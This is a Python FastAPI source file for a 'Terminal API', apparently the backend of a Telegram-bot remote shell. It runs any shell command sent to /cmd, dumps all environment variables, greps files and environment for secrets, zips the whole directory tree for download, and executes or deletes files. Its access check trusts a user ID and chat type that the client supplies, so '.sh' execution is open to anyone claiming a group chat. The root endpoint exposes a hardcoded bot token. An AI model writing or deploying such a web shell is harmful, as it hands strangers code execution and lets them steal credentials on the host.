from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import os
import subprocess
import zipfile
import shutil
from typing import List

app = FastAPI(title="Terminal API")

# ===== PLACEHOLDERS =====
BOT_TOKEN = "8718673273:AAHhE7iC8tMN3-KVTN5wLDRzENyVBwLZEF4"
OWNER_ID = 8514451353

cwd = os.getcwd()
MAX_ZIP_SIZE = 50 * 1024 * 1024

ALIASES = {
    "la": "ls -la",
    "ll": "ls -l",
}

HELP_TEXT = """📟 Terminal API Commands:
help
pwd
cd
clear
whoami
take
take all
get all
dirs
tree
rm -rf
.printenv
.grep [-i]
.py
.exec
.sh
"""


class CommandRequest(BaseModel):
    cmd: str
    user_id: int
    chat_type: str = "private"


def split_zip_all(base_path: str) -> List[str]:
    zip_index = 1
    current_size = 0
    zip_filename = f"backup_part{zip_index}.zip"
    zipf = zipfile.ZipFile(zip_filename, "w", zipfile.ZIP_DEFLATED)
    zip_files = []

    EXCLUDE_DIRS = {".git", "__pycache__", "node_modules"}
    EXCLUDE_EXT = {".pyc", ".log", ".tmp"}

    for root, dirs, files in os.walk(base_path):
        dirs[:] = [d for d in dirs if d not in EXCLUDE_DIRS]

        for file in files:
            if any(file.endswith(ext) for ext in EXCLUDE_EXT):
                continue

            filepath = os.path.join(root, file)

            try:
                size = os.path.getsize(filepath)

                if current_size + size > MAX_ZIP_SIZE:
                    zipf.close()
                    zip_files.append(zip_filename)

                    zip_index += 1
                    zip_filename = f"backup_part{zip_index}.zip"
                    zipf = zipfile.ZipFile(zip_filename, "w", zipfile.ZIP_DEFLATED)
                    current_size = 0

                zipf.write(filepath, os.path.relpath(filepath, base_path))
                current_size += size

            except Exception:
                continue

    zipf.close()
    zip_files.append(zip_filename)
    return zip_files


def run_cmd(cmd: str):
    global cwd

    if not cmd:
        return ""

    if cmd == "help":
        return HELP_TEXT

    if cmd in ALIASES:
        cmd = ALIASES[cmd]

    if cmd == "pwd":
        return cwd

    if cmd == "clear":
        return "\n" * 50

    if cmd.startswith("cd"):
        parts = cmd.split(maxsplit=1)
        path = parts[1] if len(parts) > 1 else os.path.expanduser("~")

        new_path = os.path.abspath(os.path.join(cwd, path))

        if os.path.isdir(new_path):
            cwd = new_path
            return f"📁 {cwd}"

        return "❌ No such directory"

    if cmd == "dirs":
        dirs = [d for d in os.listdir(cwd) if os.path.isdir(os.path.join(cwd, d))]
        return "\n".join(f"📁 {d}" for d in dirs) if dirs else "📁 No directories found"

    if cmd == "tree":
        items = os.listdir(cwd)

        if not items:
            return "Empty directory"

        return "\n".join(
            f"📁 {item}/" if os.path.isdir(os.path.join(cwd, item)) else f"📄 {item}"
            for item in items
        )

    if cmd == "get all":
        return {"backup_files": split_zip_all(cwd)}

    if cmd == "take all":
        return {"files": [f for f in os.listdir(cwd) if os.path.isfile(os.path.join(cwd, f))]}

    if cmd.startswith("take "):
        arg = cmd[5:].strip()
        p = os.path.join(cwd, arg)
        return {"file": p} if os.path.isfile(p) else "❌ File not found"

    if cmd == ".printenv":
        return dict(os.environ)

    if cmd.startswith(".grep "):
        parts = cmd.split()
        ignore_case = "-i" in parts

        if ignore_case:
            parts.remove("-i")

        if len(parts) < 2:
            return "Usage: .grep [-i] <text>"

        search = parts[1]
        matches = []

        def chk(x):
            return search.lower() in x.lower() if ignore_case else search in x

        for k, v in os.environ.items():
            line = f"{k}={v}"

            if chk(line):
                matches.append(f"[ENV] {line}")

        for root, _, files in os.walk(cwd):
            for f in files:
                try:
                    with open(os.path.join(root, f), "r", errors="ignore") as fh:
                        for line in fh:
                            if chk(line):
                                matches.append(f"{f}: {line.strip()}")
                except Exception:
                    pass

        return matches or ["No matches"]

    if cmd.startswith(".py "):
        path = os.path.join(cwd, cmd[4:].strip())

        if not os.path.isfile(path):
            return "❌ File not found"

        cmd = f"python '{path}'"

    if cmd.startswith(".exec "):
        path = os.path.join(cwd, cmd[6:].strip())

        if not os.path.exists(path):
            return "❌ File not found"

        cmd = f"chmod +x '{path}' && '{path}'"

    if cmd.startswith(".sh "):
        cmd = cmd[4:]

    if cmd.startswith("rm -rf "):
        path = os.path.join(cwd, cmd[7:].strip())

        try:
            shutil.rmtree(path) if os.path.isdir(path) else os.remove(path)
            return "Deleted"
        except Exception as e:
            return str(e)

    try:
        result = subprocess.check_output(
            cmd,
            shell=True,
            stderr=subprocess.STDOUT,
            cwd=cwd,
            timeout=30,
        )

        return result.decode(errors="ignore")

    except subprocess.CalledProcessError as e:
        return e.output.decode(errors="ignore")

    except Exception as e:
        return str(e)


@app.get("/")
def root():
    return {
        "status": "online",
        "cwd": cwd,
        "bot_token": BOT_TOKEN
    }


@app.post("/cmd")
def command(req: CommandRequest):
    cmd = req.cmd.strip()

    # ===== .sh FOR EVERYONE IN GROUP =====
    if cmd.startswith(".sh "):
        if req.chat_type in ["group", "supergroup"]:
            return {"result": run_cmd(cmd)}
        return {"result": "❌ .sh only works in group"}

    # ===== OWNER ONLY FOR ALL OTHER COMMANDS =====
    if req.user_id != OWNER_ID:
        return {"result": "❌ Unauthorized"}

    return {"result": run_cmd(cmd)}
